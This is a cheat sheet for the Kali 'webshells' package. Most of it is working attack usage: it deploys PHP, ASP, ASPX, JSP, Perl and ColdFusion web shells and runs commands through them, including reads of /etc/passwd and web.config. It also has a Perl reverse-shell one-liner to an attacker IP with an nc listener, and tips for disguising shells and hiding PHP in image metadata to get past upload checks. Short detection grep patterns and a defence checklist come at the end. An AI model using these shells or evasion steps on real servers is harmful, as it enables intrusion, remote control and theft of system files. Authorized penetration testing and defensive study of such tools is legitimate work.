---
title: "Webshells Cheatsheet"
tool: "Webshells"
version: "1.1"
date: "2026-07-18"
---

# Webshells Cheatsheet

## Installation

```bash
sudo apt install webshells
```

## Directory Structure

```bash
/usr/share/webshells/
├── asp/          # cmd-asp-5.1.asp, cmdasp.asp
├── aspx/         # cmdasp.aspx
├── cfm/          # cfexec.cfm
├── jsp/          # cmdjsp.jsp, jsp-reverse.jsp
├── perl/         # perlcmd.cgi, perl-reverse-shell.pl
├── php/          # simple-backdoor.php, php-reverse-shell.php, etc.
├── laudanum -> /usr/share/laudanum
└── seclists -> /usr/share/seclists/Web-Shells
```

## PHP Shells

### simple-backdoor.php (CMD Exec)

```bash
# Deploy
cp /usr/share/webshells/php/simple-backdoor.php /var/www/html/

# Execute commands
curl "http://192.168.1.50/simple-backdoor.php?cmd=id"
curl "http://192.168.1.50/simple-backdoor.php?cmd=cat+/etc/passwd"
curl "http://192.168.1.50/simple-backdoor.php?cmd=ls+-la+/var/www"
```

### php-reverse-shell.php (Reverse Shell)

```bash
# 1. Edit the script
vim /usr/share/webshells/php/php-reverse-shell.php
# Set: $ip = '192.168.1.100' (attacker IP)
# Set: $port = 4444

# 2. Start listener
nc -lvnp 4444

# 3. Deploy and trigger
# Upload shell, then access in browser or:
curl http://192.168.1.50/php-reverse-shell.php
```

### php-backdoor.php

```bash
curl -X POST -d "cmd=whoami" http://192.168.1.50/php-backdoor.php
curl "http://192.168.1.50/php-backdoor.php?cmd=uname+-a"
```

### php-findsock-shell.php

```bash
# Requires compiled findsock helper
gcc -o /usr/share/webshells/php/findsock /usr/share/webshells/php/findsock.c
# Deploy findsock binary + PHP shell to target
```

### qsd-php-backdoor.php

```bash
curl -X POST -d "cmd=ls -la" http://192.168.1.50/qsd-php-backdoor.php
```

## ASP Shells (IIS)

```bash
# cmdasp.asp - IIS command execution
curl "http://192.168.1.50/cmdasp.asp?cmd=dir"
curl "http://192.168.1.50/cmdasp.asp?cmd=whoami"

# cmd-asp-5.1.asp - IIS 5.1 specific
curl "http://192.168.1.50/cmd-asp-5.1.asp?cmd=net+user"
```

## ASPX Shell (IIS .NET)

```bash
# cmdasp.aspx - ASP.NET command execution
curl "http://192.168.1.50/cmdasp.aspx?cmd=whoami"
curl "http://192.168.1.50/cmdasp.aspx?cmd=type+C:\inetpub\wwwroot\web.config"
```

## JSP Shells (Tomcat/JBoss)

```bash
# cmdjsp.jsp - Java command execution
curl "http://192.168.1.50/cmdjsp.jsp?cmd=id"
curl "http://192.168.1.50/cmdjsp.jsp?cmd=ls+-la"

# jsp-reverse.jsp - Reverse shell
# Configure attacker IP in JSP file
nc -lvnp 4444
curl http://192.168.1.50/jsp-reverse.jsp
```

## Perl Shells

```bash
# perlcmd.cgi - CGI command execution
curl "http://192.168.1.50/perlcmd.cgi?cmd=whoami"

# perl-reverse-shell.pl - One-liner reverse shell
perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## ColdFusion Shell

```bash
# cfexec.cfm
curl "http://192.168.1.50/cfexec.cfm?cmd=ls"
curl "http://192.168.1.50/cfexec.cfm?cmd=cat+/etc/passwd"
```

## Deployment Tips

```bash
# Rename to blend in
cp /usr/share/webshells/php/simple-backdoor.php /var/www/html/images/config.inc.php

# Embed in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg
mv photo.jpg photo.php.jpg

# Upload via curl
curl -F "file=@shell.php;type=image/jpeg" http://192.168.1.50/upload.php
```

## SecLists Extended Collection

```bash
# Browse additional shells
ls /usr/share/webshells/seclists/Web-Shells/

# Laudanum shells
ls /usr/share/webshells/laudanum/
```

## Detection

```bash
# Find small PHP files (likely shells)
find /var/www/html -name "*.php" -size -5k -exec ls -la {} \;

# Search for execution functions
grep -rn "system\|exec\|passthru\|shell_exec\|eval.*base64" /var/www/html/ --include="*.php"

# Check ASP/JSP shells
grep -rn "WScript\.Shell" /var/www/html/ --include="*.asp"
grep -rn "Runtime\.getRuntime" /var/www/html/ --include="*.jsp"

# Inspect access logs
awk '/cmd=/ || /system\(/ || /base64/' /var/log/apache2/access.log
```

## Quick Reference Table

| Shell | Language | Type | Command |
|-------|----------|------|---------|
| simple-backdoor.php | PHP | CMD exec | `?cmd=whoami` |
| php-reverse-shell.php | PHP | Reverse | Connects to attacker IP |
| cmdasp.asp | ASP | CMD exec | `?cmd=dir` |
| cmdasp.aspx | ASPX | CMD exec | `?cmd=whoami` |
| cmdjsp.jsp | JSP | CMD exec | `?cmd=id` |
| jsp-reverse.jsp | JSP | Reverse | Connects to attacker IP |
| perlcmd.cgi | Perl | CMD exec | `?cmd=whoami` |
| perl-reverse-shell.pl | Perl | Reverse | One-liner Perl reverse shell |
| cfexec.cfm | CFM | CMD exec | `?cmd=ls` |

## Defense Checklist

- [ ] `disable_functions` in php.ini
- [ ] File integrity monitoring (AIDE/Tripwire)
- [ ] WAF rules for shell signatures
- [ ] Upload validation (MIME + extension)
- [ ] `open_basedir` restriction
- [ ] Web server runs as non-root
- [ ] Regular web-root audits
